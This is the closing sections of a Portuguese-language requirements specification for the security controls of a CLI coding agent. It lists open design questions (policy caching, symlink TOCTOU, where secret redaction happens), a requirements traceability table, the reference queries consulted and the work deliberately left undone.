## 9. Perguntas em aberto (para Gate 3/4, não resolvidas aqui de propósito)

Esta seção existe para que nada fique **silenciosamente** assumido — mesma disciplina que
`gate3-fase1-addendum.md` e o ADR 0002 já seguiram ao nomear lacunas em vez de forçá-las.

1. **Passe STRIDE product-wide (`gate3-fase1-addendum.md` §7).** Este documento é Gate 1/2; o Gate 3
   desta fase precisa modelar as ameaças específicas que o Command Classifier, o Network Permission e o
   Redaction Pipeline introduzem como superfícies **novas** (ex.: o próprio classificador pode ser
   enganado; o audit trail em si é um novo data store sensível — TB5 se repete para ele).
2. **Cache vs. releitura de `policy.json` durante uma sessão aberta** (edge case #10). Uma sessão longa
   que cacheia a política no início pode aplicar uma permissão já revogada pelo humano. Decisão de
   arquitetura, não de requisito — mas o requisito observável (qual comportamento o usuário deveria
   esperar) precisa ser fechado antes do Gate 6.
3. **TOCTOU de symlink** (edge case #5): entre a checagem do Permission Engine e a execução real da
   ferramenta, o alvo de um symlink pode mudar. Fase 0/1 já resolveram a checagem em si (canonicalização);
   esta fase herda o mesmo risco residual sem uma mitigação nova — nomeado para o Gate 3 avaliar
   probabilidade/impacto explicitamente, não assumido como "já coberto".
4. **`conductor session export` entra nesta fase ou só o pipeline de redação que ele usará?**
   `plano_desenvolvimento.md` §4.9 amarra "exportações aplicam redaction por seção" à Fase 2, mas o
   comando `session export` não está na lista de entregáveis nomeados da Fase 2 (§8) nem foi construído
   nas fases anteriores. Esta BA trata o requisito como: **a garantia de redação (BR-7) deve valer para
   qualquer sink presente na Fase 2**, e se `session export` não for entregue como comando nesta fase, a
   garantia se aplica no momento em que ele for entregue — decisão de escopo exata (ship agora vs. depois)
   é do Gate 4, não desta especificação.
5. **Onde a redação acontece na pipeline de dados: na escrita para o JSONL de sessão, ou só na
   renderização/exportação?** Redigir na escrita é mais forte (o segredo nunca toca disco em claro) mas
   pode conflitar com qualquer necessidade futura de replay exato da sessão. Esta especificação exige o
   resultado observável (BR-7/FR-13) sem prescrever o ponto exato do pipeline — arquitetura, Gate 4.

---

## 10. Rastreabilidade — FR/BR ↔ objetivos e entregáveis do plano (§8 Fase 2)

| Objetivo/entregável do plano | FRs | BRs |
|---|---|---|
| política fail-closed (estendida) | FR-4, FR-18, FR-22, FR-23, FR-24 | BR-1, BR-2, BR-9 |
| bloquear caminhos protegidos (protected-path extension) | FR-9, FR-10, FR-11 | BR-4, BR-5 |
| classificar operações (command classifier) | FR-1, FR-2, FR-3, FR-5 | BR-8, BR-9 |
| consentimento de rede | FR-6, FR-7, FR-8 | BR-10 |
| redigir secrets (redaction pipeline) | FR-12, FR-13, FR-14, FR-15 | BR-7, BR-12 |
| audit trail (security event log) | FR-16, FR-17, FR-18 | BR-6, BR-11 |
| modo `--yes` explícito | FR-19, FR-20, FR-21 | BR-3, BR-11 |
| políticas por projeto (`policy.json`) | FR-9, FR-10, FR-23, FR-24 | BR-4, BR-5 |
| **critério de saída:** "nenhuma ferramenta de escrita, execução, rede ou segurança poderá operar sem política correspondente" | FR-6, FR-22, FR-23 | BR-2 |

---

## 11. Grounding (biblioteca) — consultas desta sessão

Consultas rodadas via `cdt library "<pergunta>" --gate <N>` (backend saudável, 2267 chunks indexados,
`cdt library --health` confirmado desta sessão a partir de `C:\development\tools\pi`):

1. **Given/When/Then e acceptance criteria testáveis (Gate 2, usado nas seções 5-6)** — consulta:
   *"writing testable acceptance criteria in Given/When/Then format for a permission engine and
   fail-closed security policy in a TypeScript CLI coding agent"* → top **0.614**. Fontes: **Specification
   by Example — Complete Professional Guide** §2.9 ("My specs use Given/When/Then in domain language...
   A behavior change makes the spec fail until reconciled") e **Spec-Driven Development — The Complete
   Book**, Apêndice B/C.1 ("Every functional requirement has an ID and is testable... goals are clear and
   there's a non-goals section") e §14.1 (exemplo completo de critérios de aceite em Given/When/Then a
   partir de requisitos). Base direta do formato usado em todo o §5 deste documento.
2. **Glossário / linguagem ubíqua (Gate 1, usado na seção 4)** — consulta: *"ubiquitous language and
   domain glossary for a security/permission bounded context: policy, protected path, redaction, audit
   trail"* → top **0.617**. Fonte: **Domain-Driven Design — Complete Professional Guide** §1.1/§1.8/§1.12
   ("A ubiquitous language pays for itself wherever the same word means different things... The model and
   language evolve together, not separately"). Justifica a decisão de reusar termos já cunhados em código
   (Permission Gate, Protected Path) em vez de inventar sinônimos, e de nomear explicitamente os termos
   novos desta fase como tal.
3. **Goals/Non-goals e fronteira de escopo (Gate 2, seções 2-3)** — consulta: *"distinguishing goals and
   non-goals, in-scope vs out-of-scope boundaries when writing a feature specification"* → top **0.613**.
   Fonte: **Spec-Driven Development — The Complete Book**, Apêndice C.1 ("The goals are clear and there's
   a non-goals section") e Cap. 6 (componentes de uma spec completa). Usado para justificar a tabela de
   Non-goals com razão nomeada por item, em vez de uma lista sem justificativa.
4. **Regras de negócio numeradas (BR, seção 7)** — mesma consulta #2 acima retornou também
   **Spec-Driven Development — The Complete Book** §6.6 ("Business Rules (BR): domain logic that governs
   behavior, independent of screen or technology") — formato `BR-NN` desta seção segue literalmente esse
   padrão.

**Nota de cobertura honesta:** nenhuma consulta desta sessão teve como alvo direto a fundamentação de
STRIDE, dos tiers de risco de comando, ou dos limiares de entropia do redaction pipeline — esses são
achados técnicos já grounded nos documentos de Gate 3 anteriores (`gate3-threat-model.md` §9,
`gate3-fase1-addendum.md` §6) e reaproveitados por citação cruzada aqui, não re-derivados. Este documento
é uma especificação de **comportamento observável** (papel do business-analyst); a fundamentação de
*ameaça* e de *arquitetura* pertence aos Gates 3 e 4 desta fase, que ainda não rodaram.

---

## 12. Não fizemos (por instrução explícita da demanda)

- Nenhum código foi escrito ou alterado.
- Nenhuma decisão de arquitetura foi tomada (onde o Command Classifier mora como pacote, se
  `policy.json` fica em `conductor-config` ou em um `conductor-policies` novo, como o Audit Trail é
  serializado em disco) — tudo isso é Gate 4 (ADR), não este documento.
- Nenhum branch foi aberto — este documento não implementa o critério "gitflow mandatório"; a abertura de
  `feature/fase2-*` acontece quando a implementação (Gate 5/6) começar.
